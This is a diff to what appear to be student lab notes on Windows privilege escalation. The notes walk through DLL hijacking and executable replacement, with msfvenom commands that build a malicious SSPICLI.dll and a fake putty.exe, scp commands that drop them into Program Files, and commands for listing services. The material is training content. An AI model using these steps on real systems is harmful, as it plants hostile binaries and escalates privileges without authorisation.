@@ -770,7 +770,7 @@ https://sec.cybbh.io/-/public/-/jobs/870086/artifacts/slides/09-windows-priv-per
     step by step:
        1. check services! (weird locations, strange naming, lack of description etc.)
         2. double click service, check name, description, check path 
-        3. go to the path of the executable in file explorer -> attempt to write something to the directory (just create text file) if you can, this means you can put a DLL in there.
+        3. go to the path of the executable in file explorer -> attempt to write something to the directory, (just create text file) if you can, this means you can put a DLL in there. **also try to rename executable**
         4. open sysinternals, run procmon to see what DLL's the .exe uses.
         5. procmon filter processname contains .dll & process name contains (.exe)
         & result is NAME NOT FOUND
@@ -778,11 +778,19 @@ https://sec.cybbh.io/-/public/-/jobs/870086/artifacts/slides/09-windows-priv-per
         7. open linops -> create msfvenom command -> msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\Student\Desktop\whoami.txt' -f dll > SSPICLI.dll
         8. go back to windows on powershell -> scp that file you just created from linops back to windows ->  scp student@10.50.36.204:/home/student/SSPICLI.dll "C:\Program Files (x86)\Putty\SSPICLI.DLL" 
         9. run the executable -> with this msfvenom command, this should drop a text file with the contents of your command on the desktop.
-        
-        
-        
 
+## Demo renaming / writing (EXE replacement) if you can rename, use exe replacement.
+    1. rename the .exe file to something else.
+    2. go to linops and craft ya payload -> msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\Student\Desktop\whoami.txt' -f exe > putty.exe
+    3. scp this back to the target box. -> scp student@10.50.36.204:/home/student/putty.exe "C:\Program Files (x86)\Putty\putty.exe"
+    4. then run the executable.
         
+        
+## DEMO: Finding Vulnerable Services
+
+    wmic service list full
+    sc query        
+
 ## get sys internals tools
     net use z: "\\http://live.sysinternals.com" /persistent:yes 
     
